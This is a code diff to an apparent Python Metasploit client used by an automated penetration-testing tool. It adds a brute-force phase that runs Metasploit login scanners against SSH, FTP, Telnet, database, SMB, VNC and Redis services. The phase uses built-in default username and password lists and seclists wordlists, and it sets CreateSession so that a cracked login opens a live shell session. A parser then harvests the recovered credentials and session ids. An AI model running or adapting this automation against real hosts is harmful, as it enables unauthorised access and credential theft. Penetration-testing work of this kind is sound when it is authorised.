@@ -21,12 +21,13 @@ import os
 import queue
 import re
 import socket
+import subprocess
 import sys
 import threading
 import time
 from dataclasses import dataclass
 
-from state import Candidate, Session, Verdict, verdict_from_msf
+from state import Candidate, Credential, Session, Verdict, verdict_from_msf
 
 logger = logging.getLogger(__name__)
 
@@ -150,6 +151,8 @@ class MsfConfig:
     username: str = "msf"
     check_timeout: int = 60
     exploit_timeout: int = 90
+    brute_timeout: int = 600        # per-service login scanner cap
+    brute_threads: int = 8          # parallel attempts within one login scanner
     candidates_per_service: int = 5
     rank_floor: int = 400           # Good and up
     product_search: bool = True     # also search msf by product/service name
@@ -599,6 +602,53 @@ class MsfClient:
         if port is not None:
             self._lport_pool.put(port)
 
+    # -- brute (console path) --
+
+    def brute_service(self, service, login_module, rhost, port,
+                      user_file, pass_file):
+        """Run an MSF login scanner against one service on a fresh isolated
+        console. STOP_ON_SUCCESS so it takes the first valid pair and stops;
+        CreateSession so a session-capable service (ssh/telnet/ftp) opens a real
+        session that flows into the run alongside exploit sessions. Returns
+        (list[Credential], list[Session]) parsed from the console output. Options
+        the module does not declare (USER_FILE on password-only services like vnc
+        or redis, CreateSession on db logins) are simply ignored by the module."""
+        self._activity("msf", f"brute {login_module} @ {rhost}:{port}")
+        cid = None
+        try:
+            console = self._client.consoles.console()
+            cid = console.cid
+            lines = [f"use {login_module}", f"set RHOSTS {rhost}"]
+            if port:
+                lines.append(f"set RPORT {int(port)}")
+            lines += [
+                f"set USER_FILE {user_file}",
+                f"set PASS_FILE {pass_file}",
+                "set STOP_ON_SUCCESS true",
+                "set CreateSession true",
+                "set BLANK_PASSWORDS true",
+                "set USER_AS_PASS true",
+                "set VERBOSE false",
+                f"set THREADS {int(self.cfg.brute_threads)}",
+                "run",
+            ]
+            data = self._console_run(console, "\n".join(lines) + "\n",
+                                     self.cfg.brute_timeout)
+            creds, sessions = _parse_brute_output(data, service, port,
+                                                  login_module)
+            logger.info("brute %s @ %s:%s -> %d credential(s), %d session(s)",
+                        login_module, rhost, port, len(creds), len(sessions))
+            return creds, sessions
+        except Exception as e:
+            logger.warning("brute error %s on %s: %s", login_module, rhost, e)
+            return [], []
+        finally:
+            if cid is not None:
+                try:
+                    self._client.consoles.destroy(cid)
+                except Exception:
+                    pass
+
 
 # --- module helpers (no live server required) ------------------------------
 
@@ -811,6 +861,131 @@ def _lhost_for(target):
 
 
 __all__ = ["MsfConfig", "MsfClient", "MsfUnavailable", "RANK_VALUES"]
+
+
+# --- credential brute forcing ----------------------------------------------
+# Seclists base lists the locate() resolver searches for. The orchestrator stores
+# the resolved absolute paths in .orchestration_config and reuses them; if locate
+# returns nothing it falls back to the small built-in lists below.
+BRUTE_USER_SEED = "top-usernames-shortlist.txt"
+BRUTE_PASS_SEED = "10-million-password-list-top-1000.txt"
+
+_BUILTIN_USERS = [
+    "root", "admin", "administrator", "user", "guest", "msfadmin",
+    "postgres", "mysql", "sa", "tomcat", "ubuntu", "oracle", "test",
+    "service", "operator",
+]
+_BUILTIN_PASSWORDS = [
+    "", "password", "123456", "admin", "root", "toor", "msfadmin",
+    "postgres", "mysql", "sa", "tomcat", "changeme", "letmein", "12345678",
+    "password123", "welcome", "test", "guest", "qwerty", "abc123",
+]
+
+# nmap service name (lowercased) -> MSF login scanner. RDP is intentionally
+# absent: stock MSF has no working rdp_login, so RDP services are skipped.
+_LOGIN_MODULES = {
+    "ssh": "auxiliary/scanner/ssh/ssh_login",
+    "ftp": "auxiliary/scanner/ftp/ftp_login",
+    "telnet": "auxiliary/scanner/telnet/telnet_login",
+    "mysql": "auxiliary/scanner/mysql/mysql_login",
+    "postgresql": "auxiliary/scanner/postgres/postgres_login",
+    "postgres": "auxiliary/scanner/postgres/postgres_login",
+    "ms-sql-s": "auxiliary/scanner/mssql/mssql_login",
+    "mssql": "auxiliary/scanner/mssql/mssql_login",
+    "microsoft-ds": "auxiliary/scanner/smb/smb_login",
+    "netbios-ssn": "auxiliary/scanner/smb/smb_login",
+    "smb": "auxiliary/scanner/smb/smb_login",
+    "vnc": "auxiliary/scanner/vnc/vnc_login",
+    "redis": "auxiliary/scanner/redis/redis_login",
+}
+# Port fallback when the nmap service name is unrecognized.
+_LOGIN_PORTS = {
+    22: "auxiliary/scanner/ssh/ssh_login",
+    21: "auxiliary/scanner/ftp/ftp_login",
+    23: "auxiliary/scanner/telnet/telnet_login",
+    3306: "auxiliary/scanner/mysql/mysql_login",
+    5432: "auxiliary/scanner/postgres/postgres_login",
+    1433: "auxiliary/scanner/mssql/mssql_login",
+    445: "auxiliary/scanner/smb/smb_login",
+    139: "auxiliary/scanner/smb/smb_login",
+    5900: "auxiliary/scanner/vnc/vnc_login",
+    6379: "auxiliary/scanner/redis/redis_login",
+}
+
+_BRUTE_SUCCESS_RE = re.compile(r"Success:\s*'([^']*)'")
+_BRUTE_SUCCESS_ALT_RE = re.compile(r"Login Successful:\s*([^\s,()]+)",
+                                   re.IGNORECASE)
+_BRUTE_SESSION_RE = re.compile(r"session\s+(\d+)\s+opened", re.IGNORECASE)
+
+
+def login_module_for(service_name, port):
+    """The MSF login scanner for a service, by nmap name then port, or "" if the
+    service has no login scanner we run (e.g. http, rdp)."""
+    if service_name:
+        mod = _LOGIN_MODULES.get(service_name.strip().lower())
+        if mod:
+            return mod
+    return _LOGIN_PORTS.get(int(port) if port else 0, "")
+
+
+def locate_wordlist(filename):
+    """`locate <filename>`, returning the best existing absolute path or "".
+    Prefers a hit under a seclists directory, else the first existing hit."""
+    try:
+        proc = subprocess.run(
+            ["locate", filename], stdin=subprocess.DEVNULL,
+            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
+            timeout=20, text=True)
+    except (OSError, subprocess.SubprocessError):
+        return ""
+    hits = [ln.strip() for ln in proc.stdout.splitlines()
+            if ln.strip() and os.path.isfile(ln.strip())]
+    if not hits:
+        return ""
+    seclists = [h for h in hits if "seclists" in h.lower()]
+    return (seclists or hits)[0]
+
+
+def write_builtin_wordlists():
+    """Write the small built-in user/password lists to temp files and return
+    (user_path, pass_path). The caller removes them when the brute phase ends."""
+    import tempfile
+
+    def _write(lines):
+        fd, path = tempfile.mkstemp(prefix=".brute_", suffix=".lst")
+        with os.fdopen(fd, "w") as f:
+            f.write("\n".join(lines) + "\n")
+        return path
+
+    return _write(_BUILTIN_USERS), _write(_BUILTIN_PASSWORDS)
+
+
+def _parse_brute_output(data, service, port, module):
+    """Pull credentials and opened-session ids from a login scanner's console
+    output. MSF prints `[+] host:port - Success: 'user:pass' (...)` and, when a
+    session opens, `... session N opened ...`. STOP_ON_SUCCESS yields one success
+    per service, but the parser tolerates several and pairs each opened session
+    with its credential in order."""
+    raw = []
+    for line in data.splitlines():
+        m = _BRUTE_SUCCESS_RE.search(line) or _BRUTE_SUCCESS_ALT_RE.search(line)
+        if m and m.group(1) not in raw:
+            raw.append(m.group(1))
+    creds = []
+    for item in raw:
+        user, sep, pw = item.partition(":")
+        creds.append(Credential(service=service or "", port=int(port or 0),
+                                username=user, password=pw if sep else "",
+                                module=module))
+    sessions = []
+    for i, sid in enumerate(_BRUTE_SESSION_RE.findall(data)):
+        cred = creds[i] if i < len(creds) else None
+        if cred is not None:
+            cred.session_id = sid
+        info = f"{cred.username}:{cred.password}" if cred else ""
+        sessions.append(Session(session_id=sid, module=module, payload="",
+                                info=info))
+    return creds, sessions
 
 
 # --- session console: python msf.py [-i ID | -k ID... | -K] ----------------
